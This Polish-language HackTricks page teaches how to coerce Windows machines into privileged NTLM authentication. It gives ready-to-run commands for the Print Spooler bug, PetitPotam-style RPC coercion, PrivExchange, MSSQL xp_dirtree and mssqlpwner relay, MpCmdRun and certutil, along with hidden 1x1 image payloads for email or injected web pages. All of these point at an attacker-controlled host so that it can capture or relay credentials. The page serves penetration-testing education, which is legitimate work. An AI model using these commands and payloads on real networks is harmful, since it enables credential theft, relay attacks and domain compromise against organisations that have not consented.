# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) to **kolekcja** zdalnych triggerów uwierzytelniania napisana w C# z użyciem kompilatora MIDL, co pozwala uniknąć zależności stron trzecich.

## Spooler Service Abuse

Jeśli usługa _**Print Spooler**_ jest **włączona**, możesz użyć już znanych poświadczeń AD, aby **zażądać** od serwera wydruku Domain Controller **aktualizacji** o nowe zadania drukowania i po prostu nakazać mu **wysłać powiadomienie do dowolnego systemu**.\
Uwaga: gdy drukarka wysyła powiadomienie do arbitralnego systemu, musi się wobec niego **uwierzytelnić**. W związku z tym atakujący może sprawić, że usługa _**Print Spooler**_ uwierzytelni się wobec dowolnego systemu, a usługa w tym uwierzytelnieniu **użyje konta komputera**.

### Finding Windows Servers on the domain

Używając PowerShell, uzyskaj listę maszyn Windows. Serwery zwykle mają priorytet, więc skupmy się na nich:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Wykrywanie nasłuchujących usług Spooler

Używając nieco zmodyfikowanego [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autorstwa @mysmartlogin (Vincent Le Toux), sprawdź, czy Spooler Service nasłuchuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Możesz też użyć rpcdump.py na Linux i poszukać MS-RPRN Protocol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Poproś usługę o uwierzytelnienie do dowolnego hosta

Możesz skompilować [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
lub użyj [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) lub [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) jeśli jesteś na Linuxie
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Łączenie z Unconstrained Delegation

Jeśli atakujący już skompromitował komputer z [Unconstrained Delegation](unconstrained-delegation.md), może on sprawić, że **drukarka uwierzytelni się wobec tego komputera**. Z powodu Unconstrained Delegation, **TGT** **konta komputera drukarki** zostanie **zapisany w** **pamięci** komputera z Unconstrained Delegation. Ponieważ atakujący ma już dostęp do tego hosta, będzie w stanie **pobrać ten ticket** i go nadużyć ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Uwaga: Metody te akceptują parametry, które mogą zawierać ścieżkę UNC (np. `\\attacker\share`). Po ich przetworzeniu Windows uwierzytelni się (kontekst maszyna/użytkownik) do tej ścieżki UNC, co umożliwia przechwycenie NetNTLM lub relay.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interfejs: MS-EVEN przez \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Sygnatura wywołania: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Skutek: cel próbuje otworzyć podaną ścieżkę pliku kopii zapasowej i uwierzytelnia się do kontrolowanej przez atakującego ścieżki UNC.
- Praktyczne użycie: wymusić na zasobach Tier 0 (DC/RODC/Citrix/etc.) emisję NetNTLM, a następnie relay do punktów końcowych AD CS (scenariusze ESC8/ESC11) lub innych uprzywilejowanych usług.

## PrivExchange

Atak `PrivExchange` jest wynikiem luki znalezionej w funkcji Exchange Server `PushSubscription`. Funkcja ta pozwala zmusić serwer Exchange, aby dowolny użytkownik domenowy z mailboxem uwierzytelnił się do dowolnego hosta podanego przez klienta przez HTTP.

Domyślnie **usługa Exchange uruchamia się jako SYSTEM** i posiada nadmierne uprawnienia (konkretnie ma uprawnienia **WriteDacl** na domenie przed 2019 Cumulative Update). Tę lukę można wykorzystać do umożliwienia przekazywania informacji do LDAP i w konsekwencji wyodrębnienia bazy danych NTDS domeny. W przypadkach, gdy relay do LDAP nie jest możliwy, tę lukę można nadal wykorzystać do relayu i uwierzytelniania do innych hostów w domenie. Pomyślne wykorzystanie tego ataku daje natychmiastowy dostęp do Domain Admin przy użyciu dowolnego uwierzytelnionego konta domenowego.

## Inside Windows

Jeżeli jesteś już na maszynie Windows, możesz zmusić Windows do połączenia się z serwerem używając kont uprzywilejowanych za pomocą:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Albo użyj tej innej techniki: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Można użyć certutil.exe lolbin (Microsoft-signed binary) do wymuszenia uwierzytelnienia NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Jeśli znasz **adres e-mail** użytkownika, który loguje się na maszynę, którą chcesz przejąć, możesz po prostu wysłać mu **e-mail z obrazkiem 1x1** taki jak
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
a kiedy to otworzy, spróbuje się uwierzytelnić.

### MitM

Jeśli możesz wykonać atak MitM na komputer i wstrzyknąć HTML w stronę, którą użytkownik zobaczy, możesz spróbować wstrzyknąć na stronę obrazek jak poniżej:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Inne sposoby wymuszania i wyłudzania uwierzytelnienia NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Łamanie NTLMv1

Jeśli możesz przechwycić [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Pamiętaj, że aby złamać NTLMv1 musisz ustawić Responder challenge na "1122334455667788"_

## Referencje
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
